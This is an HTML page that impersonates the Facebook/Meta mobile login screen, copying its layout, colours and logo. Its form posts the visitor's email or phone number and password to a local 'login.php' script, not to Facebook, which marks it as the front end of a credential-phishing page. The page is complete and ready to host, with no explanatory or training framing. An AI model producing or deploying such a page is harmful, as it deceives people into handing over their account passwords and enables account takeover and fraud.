<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            padding: 20px;
            height: 100%;
        }
        .top-section {
            flex-grow: 1;
        }
        .language {
            text-align: center;
            color: #65676b;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 12px;
        }
        .input-group input {
            width: 100%;
            padding: 16px;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
            color: #1c1e21;
        }
        .input-group input::placeholder {
            color: #8a8d91;
        }
        .input-group input:focus {
            border-color: #0064e0;
        }
        .btn-primary {
            width: 100%;
            padding: 14px;
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
        }
        .forgot-password {
            display: block;
            text-align: center;
            margin-top: 16px;
            color: #000000;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }
        .bottom-section {
            padding-bottom: 20px;
        }
        .btn-secondary {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            color: #0064e0;
            border: 1px solid #0064e0;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 16px;
        }
        .meta-logo {
            text-align: center;
            color: #4b4f56;
            font-size: 16px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }
        .meta-logo span {
            color: #0064e0;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="top-section">
            <div class="language">English (UK)</div>
            <form action="login.php" method="POST">
                <div class="input-group">
                    <input type="text" name="email" placeholder="Mobile number or email address" required>
                </div>
                <div class="input-group">
                    <input type="password" name="pass" placeholder="Password" required>
                </div>
                <button type="submit" class="btn-primary">Log in</button>
            </form>
            <a href="#" class="forgot-password">Forgotten password?</a>
        </div>
        <div class="bottom-section">
            <button type="button" class="btn-secondary">Create new account</button>
            <div class="meta-logo"><span>∞</span> Meta</div>
        </div>
    </div>
</body>
</html>
